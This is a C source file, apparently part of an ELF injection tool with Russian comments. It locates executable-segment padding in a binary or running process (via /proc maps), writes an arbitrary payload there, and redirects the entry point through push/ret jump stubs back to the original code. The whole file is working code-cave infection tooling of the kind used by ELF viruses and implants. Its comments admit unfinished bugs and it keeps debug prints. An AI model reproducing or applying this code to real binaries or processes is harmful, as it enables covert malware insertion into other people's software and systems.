#include "core_api.h"
#include "injectMethods.h"

#include <elf.h>
#include <fcntl.h>
#include <unistd.h>

#include <QDebug>

#define JMP32_SZ 0x06
#define JMP64_SZ 0x14

static int getProcAddr(char *target, struct TargetInfo *ti);


int saveTargetInfo(int fd, struct TargetInfo *ti, char *target) {
    unsigned char magic[4];
    uint16_t e_type;

    if (pread(fd, magic, sizeof(magic), 0) == -1) { return 1; }
    if (!(magic[0] == 0x7F && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F')) { return 1; }

    if (target && getProcAddr(target, ti)) {
        return 1;
    } else {
        ti->process_addr = 0;
    }

    if (pread(fd, &ti->ei_class, sizeof(ti->ei_class), ti->process_addr + 0x04) == -1) { return 1; }
    if (pread(fd, &e_type, sizeof(uint16_t), ti->process_addr + 0x10) == -1) { return 1; }

    // А как же ET_REL?? !!!
    if (e_type == ET_EXEC) {
        ti->pic = false; 
    } else if (e_type == ET_DYN) {
        ti->pic = true;
    } else {
        return 1;
    }
    
    if (ti->ei_class == ELFCLASS32) {
        // if (pread(fd, &ti->ti32.e_entry, sizeof(ti->ti32.e_entry), ti->process_addr + 0x18) == -1) { return 1; }
        if (pread(fd, &ti->ti32.e_phoff, sizeof(ti->ti32.e_phoff), ti->process_addr + 0x1c) == -1) { return 1; }
        if (pread(fd, &ti->ti32.e_shoff, sizeof(ti->ti32.e_shoff), ti->process_addr + 0x20) == -1) { return 1; }
        
        if (pread(fd, &ti->e_phentsize, sizeof(ti->e_phentsize), ti->process_addr + 0x2a) == -1) { return 1; }
        if (pread(fd, &ti->e_phnum, sizeof(ti->e_phnum), ti->process_addr + 0x2c) == -1) { return 1; }
        if (pread(fd, &ti->e_shentsize, sizeof(ti->e_shentsize), ti->process_addr + 0x2e) == -1) { return 1; }
        if (pread(fd, &ti->e_shnum, sizeof(ti->e_shnum), ti->process_addr + 0x30) == -1) { return 1; }
        if (pread(fd, &ti->e_shstrndx, sizeof(ti->e_shstrndx), ti->process_addr + 0x32) == -1) { return 1; }

    } else if (ti->ei_class == ELFCLASS64) {
        // if (pread(fd, &ti->ti64.e_entry, sizeof(ti->ti64.e_entry), ti->process_addr + 0x18) == -1) { return 1; }
        if (pread(fd, &ti->ti64.e_phoff, sizeof(ti->ti64.e_phoff), ti->process_addr + 0x20) == -1) { return 1; }
        if (pread(fd, &ti->ti64.e_shoff, sizeof(ti->ti64.e_shoff), ti->process_addr + 0x28) == -1) { return 1; }
        
        if (pread(fd, &ti->e_phentsize, sizeof(ti->e_phentsize), ti->process_addr + 0x36) == -1) { return 1; }
        if (pread(fd, &ti->e_phnum, sizeof(ti->e_phnum), ti->process_addr + 0x38) == -1) { return 1; }
        if (pread(fd, &ti->e_shentsize, sizeof(ti->e_shentsize), ti->process_addr + 0x3a) == -1) { return 1; }
        if (pread(fd, &ti->e_shnum, sizeof(ti->e_shnum), ti->process_addr + 0x3c) == -1) { return 1; }
        if (pread(fd, &ti->e_shstrndx, sizeof(ti->e_shstrndx), ti->process_addr + 0x3e) == -1) { return 1; }

    } else {
        return 1;
    }

    return 0;
}

static int getProcAddr(char *target, struct TargetInfo *ti) {
    char buffer[256];
    char file_path[1024];
    char maps[] = "maps";
    char exe[] = "exe";

    snprintf(buffer, sizeof(buffer), "%s/%s", target, exe);

    ssize_t file_path_len = readlink(buffer, file_path, sizeof(file_path)-1);
    if (file_path_len == -1) {
        return 1;
    }
    
    file_path[file_path_len] = '\0';  
    
    snprintf(buffer, sizeof(buffer), "%s/%s", target, maps);

    FILE *file = fopen(buffer, "r");
    if (file == NULL) {
        return 1;
    }

    char line[1024];
    bool is_process_addr = false;
    
    while (fgets(line, sizeof(line), file) != NULL) { 
        char address_str[16];

        if (sscanf(line, "%30[^-]", address_str) != 1) {
            return 1;
        }

        if (strstr(line, file_path) != NULL && !is_process_addr) {
            ti->process_addr = strtoul(address_str, NULL, 16);
            is_process_addr = true;
        } 
    }

    fclose(file);
    return 0;
}


int injectPayload(int fd, struct TargetInfo *ti, struct Payload *payload) {
    for (uint16_t ph = 0; ph < ti->e_phnum; ph++ ) {

        if (ti->ei_class == ELFCLASS32) {
            ti->ti32.e_phoff += ti->e_phentsize;

            uint32_t p_type;
            uint32_t p_flags;
            
            if (pread(fd, &p_type, sizeof(p_type), ti->process_addr + ti->ti32.e_phoff) == -1) {
                return 1;
            }

            if (pread(fd, &p_flags, sizeof(p_flags), ti->process_addr + ti->ti32.e_phoff + 0x18) == -1) {
                return 1;
            }

            if (p_type == PT_LOAD && p_flags & PF_X) {
                uint32_t p_vaddr_next; // e_phoff совпадает с vaddr 
                if (pread(fd, &p_vaddr_next, sizeof(p_vaddr_next), ti->process_addr + ti->ti32.e_phoff + ti->e_phentsize + 0x08) == -1) {
                    return 1;
                }

                if (p_vaddr_next % 0x1000 == 0) {  
                    uint32_t p_offset;
                    uint32_t p_vaddr;
                    uint32_t p_filesz;

                    if (pread(fd, &p_offset, sizeof(p_offset), ti->process_addr + ti->ti32.e_phoff + 0x04) == -1) {
                        return 1;
                    }

                    if (pread(fd, &p_vaddr, sizeof(p_vaddr), ti->process_addr + ti->ti32.e_phoff + 0x08) == -1) {
                        return 1;
                    }

                    if (pread(fd, &p_filesz, sizeof(p_filesz), ti->process_addr + ti->ti32.e_phoff + 0x10) == -1) {
                        return 1;
                    }
                    ti->ti32.offset_payload = p_offset + p_filesz;
                    ti->ti32.vaddr_payload = p_vaddr + p_filesz;

                    if (ti->ti32.offset_payload + payload->size + JMP32_SZ <= p_vaddr_next) { 
                        if (ti->pic) {
                            if (pwrite(fd, payload->addr, payload->size, ti->process_addr + ti->ti32.offset_payload) == -1) {
                                return 1;
                            }
                            
                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->process_addr + ti->ti32.offset_payload, 8, 16, QLatin1Char('0')).toUpper();

                        } else {
                            if (pwrite(fd, payload->addr, payload->size, ti->ti32.offset_payload) == -1) {
                                return 1;
                            }
                            
                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->ti32.offset_payload, 8, 16, QLatin1Char('0')).toUpper();
                        }

                        break;
                    }
                }
            }

        } else {
            ti->ti64.e_phoff += ti->e_phentsize;
            
            uint32_t p_type;
            uint32_t p_flags;

            if (pread(fd, &p_type, sizeof(p_type), ti->process_addr + ti->ti64.e_phoff) == -1) {
                return 1;
            }
            if (pread(fd, &p_flags, sizeof(p_flags), ti->process_addr + ti->ti64.e_phoff + 0x04) == -1) {
                return 1;
            }

            if (p_type == PT_LOAD && p_flags & PF_X) {
                uint64_t p_vaddr_next;      // e_phoff совпадает с vaddr 
                if (pread(fd, &p_vaddr_next, sizeof(p_vaddr_next), ti->process_addr + ti->ti64.e_phoff + ti->e_phentsize + 0x10) == -1) {
                    return 1;
                }

                if (p_vaddr_next % 0x1000 == 0) {  
                    uint64_t p_offset; 
                    uint64_t p_vaddr; 
                    uint64_t p_filesz;

                    if (pread(fd, &p_offset, sizeof(p_offset), ti->process_addr + ti->ti64.e_phoff + 0x08) == -1) {
                        return 1;
                    }

                    if (pread(fd, &p_vaddr, sizeof(p_vaddr), ti->process_addr + ti->ti64.e_phoff + 0x10) == -1) {
                        return 1;
                    }

                    if (pread(fd, &p_filesz, sizeof(p_filesz), ti->process_addr + ti->ti64.e_phoff + 0x20) == -1) {
                        return 1;
                    }
            
                    ti->ti64.offset_payload = p_offset + p_filesz;
                    ti->ti64.vaddr_payload = p_vaddr + p_filesz;

                    if (p_filesz + payload->size + JMP64_SZ <= p_vaddr_next) {   
                        if (ti->pic) {
                            if (pwrite(fd, payload->addr, payload->size, ti->process_addr + ti->ti64.offset_payload) == -1) {
                                return 1;
                            }

                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->process_addr + ti->ti64.offset_payload, 8, 16, QLatin1Char('0')).toUpper();
                        } else {
                            if (pwrite(fd, payload->addr, payload->size, ti->ti64.offset_payload) == -1) {
                                return 1;
                            }

                            qDebug() << QString("  [+] Нагрузка распологается по адресу 0x%1")
                                    .arg(ti->ti64.offset_payload, 8, 16, QLatin1Char('0')).toUpper();
                        }

                        break;
                    }
                }
            }
        }

    } 
    return 0;
}


// Функция вставки перехода адрес
// IN back_addr - адрес строки байт (разница адресов)
// IN inject_addr - адрес вставки инструкции jmp
// IN *pi - адрес структуры 
int inject_jmp32(int fd, uint32_t back_addr, uint32_t inject_addr) {
    uint8_t jmp[JMP32_SZ] = {
        0x68, 0x00, 0x00, 0x00, 0x00,                      // push addr
        0xc3};                                             // ret

    // Заполнение инструкции
    jmp[1] = back_addr & 0xff;
    jmp[2] = (back_addr >> 8) & 0xff;
    jmp[3] = (back_addr >> 16) & 0xff;
    jmp[4] = (back_addr >> 24) & 0xff;

    // Вставка инструкции
    if (pwrite(fd, jmp, sizeof(jmp), inject_addr) == -1) {
        perror("    [!] inject_jmp32: pwrite: jmp");
        return 1;
    }

    return 0;
}

// Функция вставки перехода адрес
// IN back_addr - адрес назначения
// IN inject_addr - адрес вставки инструкции
// IN *pi - адрес структуры 
int inject_jmp64(int fd, uint64_t back_addr, uint64_t inject_addr) {
    uint8_t jmp[JMP64_SZ] = {
        0x48, 0x83, 0xec, 0x08,                             // sub rsp, 0x08
        0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00,     // mov [rsp + 0x04], ...    - первые 4 байта адреса
        0xc7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00,           // mov [rsp], ...           - последние 4 байта адреса
        0xc3};                                              // ret

    // Заполнение инструкции
    jmp[15] = back_addr & 0xff;
    jmp[16] = (back_addr >> 8) & 0xff;
    jmp[17] = (back_addr >> 16) & 0xff;
    jmp[18] = (back_addr >> 24) & 0xff;

    jmp[8] = (back_addr >> 32) & 0xff;
    jmp[9] = (back_addr >> 40) & 0xff;
    jmp[10] = (back_addr >> 48) & 0xff;
    jmp[11] = (back_addr >> 56) & 0xff;

    // Вставка инструкции
    if (pwrite(fd, jmp, sizeof(jmp), inject_addr) == -1) {
        perror("    [!] inject_jmp64: pwrite: jmp");
        return 1;
    }

    return 0;
}

// Функция изменения адреса точки входа
// работатет только для exec чтоль?? подумать, как исправить. надо лишь изменить способ возврата из нагрузки. ща push + ret. в r12 лежит адрес с учетом базы загрузки
// а для exec почему то не пишется jmp этот
int fm_e_entry(int fd, struct TargetInfo *ti, struct Payload *payload) {

    if (ti->ei_class == ELFCLASS32) {
        uint32_t e_entry;

        if (pread(fd, &e_entry, sizeof(e_entry), ti->process_addr + 0x18) == -1) { return 1; }
        if (pwrite(fd, &ti->ti32.vaddr_payload, sizeof(ti->ti32.vaddr_payload), ti->process_addr + 0x18) == -1) { return 1; }
        
        inject_jmp32(fd, e_entry, ti->ti32.vaddr_payload + payload->size);

    } else {
        uint64_t e_entry;

        if (pread(fd, &e_entry, sizeof(e_entry), ti->process_addr + 0x18) == -1) { return 1; }
        qDebug() << "Hola" << e_entry;
        qDebug() << "Hola" << ti->ti64.vaddr_payload;
        qDebug() << "Hola" << ti->ti64.offset_payload;


        if (pwrite(fd, &ti->ti64.vaddr_payload, sizeof(ti->ti64.vaddr_payload), ti->process_addr + 0x18) == -1) { return 1; }
        
        if (!ti->pic) {
            inject_jmp64(fd, e_entry, ti->ti64.vaddr_payload + payload->size);
        } else {
            inject_jmp64(fd, e_entry, ti->ti64.offset_payload + payload->size);
        }
        qDebug() << "Hola";

    }

    return 0;
}
